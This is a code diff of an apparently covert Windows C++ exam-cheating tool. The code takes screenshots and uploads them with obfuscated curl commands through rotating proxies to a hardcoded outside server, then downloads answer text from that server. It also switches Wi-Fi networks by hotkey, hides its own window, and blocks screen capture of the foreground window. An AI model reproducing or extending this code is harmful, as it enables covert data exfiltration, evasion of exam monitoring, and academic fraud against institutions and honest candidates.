@@ -39,6 +39,7 @@ using Set_CursorPos_WINAPI = BOOL(int, int);
 using Get_CursorPos_WINAPI = BOOL(LPPOINT);
 using Is_Admin = BOOL();
 const auto s_wint = WinApiImport<Set_WinText_WINAPI>::get(AY_OBFUSCATE("SetWindowTextA"), AY_OBFUSCATE("User32.dll"));
+int dow = 0;
 struct Pos
 {
 	int x = 0;
@@ -85,7 +86,7 @@ void take_picture(int &i)
 	scrdc = ::GetDC(eos);
 	memdc = CreateCompatibleDC(scrdc);
 	int Width = rc.right - rc.left;
-	int Height = rc.bottom - rc.top - 150;
+	int Height = rc.bottom - rc.top- 150;
 	membit = CreateCompatibleBitmap(scrdc, Width, Height);
 	HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
 	BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 125, SRCCOPY);
@@ -101,7 +102,7 @@ void take_picture(int &i)
 	encoderParameters.Parameter[0].Guid = EncoderQuality;
 	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
 	encoderParameters.Parameter[0].NumberOfValues = 1;
-	quality = 25;
+	quality = 100;//25;
 	encoderParameters.Parameter[0].Value = &quality;
 	std::string file;
 
@@ -119,8 +120,8 @@ void take_picture(int &i)
 	::ReleaseDC(0, scrdc);
 	file = x + std::to_string(i);
 	char cmd[512];
-	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 %s.jpeg -o %s.webp", file, file);
-	//sprintf(cmd, "conhost %s.jpeg -o %s.webp", file, file);
+	//sprintf(cmd, "conhost -q 1 -m 6 -segments 1 %s.jpeg -o %s.webp", file, file);
+	sprintf(cmd, "conhost %s.jpeg -o %s.webp", file, file);
 	system(cmd);
 
 	sprintf(cmd, "del %s.jpeg", file);
@@ -217,8 +218,8 @@ void gdiscreen()
 		if (get_key(VK_F7))//Connect to wifi exam
 		{
 			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name= "v983" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name= "v983" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "cuuvuive2" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "cuuvuive2" interface="Wi-Fi")"));
 			type = 2;
 			Sleep(100);
 		}
@@ -266,10 +267,10 @@ void gdiscreen()
 			for (int j = 0; j <n; j++)
 			{
 				s = "";
-				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"
+				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"bi
 				//sprintf(cmd, AY_OBFUSCATE(R"("t2 -F "uploadedfile=@%s.webp" http://103.143.143.227/up.php?floder="uploads/abc/"")"), file);
-				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/new_hl839/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
-				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/new_hl839/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/alpha_9832/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/alpha_9832/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
 				if(!std::count(uploaded_file.begin(), uploaded_file.end(), vec_file("")[j])) system(cmd);
 				else continue;
 				newfile2.open("stats.txt", std::ios::in);
@@ -289,6 +290,11 @@ void gdiscreen()
 				Sleep(50);
 			}
 			Sleep(200);
+		}
+		if(get_key(VK_F10))
+		{
+			SetWindowDisplayAffinity(GetForegroundWindow(), 1);
+			Sleep(100);
 		}
 		if (get_key(VK_F4))
 		{
@@ -311,9 +317,20 @@ void gdiscreen()
 			newfile2.close();
 			system("del wlan.txt");
 			printf("------------------------DOWNLOAD------------------\n");
+			
 			char cmd[500];
-			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227/new_hl839.txt -o "work.txt"")"));
-			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/new_hl839.txt -o "work.txt"")"));
+			if (type == 1)
+			{
+				if(dow==0) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.45:8080 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
+				else if(dow==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
+				else if (dow == 2)
+				{
+					sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.193.47:8080 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
+					dow = 0;
+				}
+				dow +=1;
+			}
+			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
 			system(cmd);
 			printf("--------------------------------------------------");
 			Sleep(100);	
@@ -394,15 +411,14 @@ int main()
 		std::string key;
 		printf(AY_OBFUSCATE("key:"));
 		std::cin >> key;
-		const char *x = AY_OBFUSCATE("new_hl839");
+		const char *x = AY_OBFUSCATE("peprf");
 		if (key == x)
 		{
 			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
 			Sleep(2000);
-			s_wint(gcs_w(), "");
-		    sw(gcs_w(), SW_HIDE);
-			//HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, NULL);
-			gdiscreen();
+			//s_wint(gcs_w(), "");
+		    //sw(gcs_w(), SW_HIDE);
+			//gdiscreen();
 		}
 		else
 		{
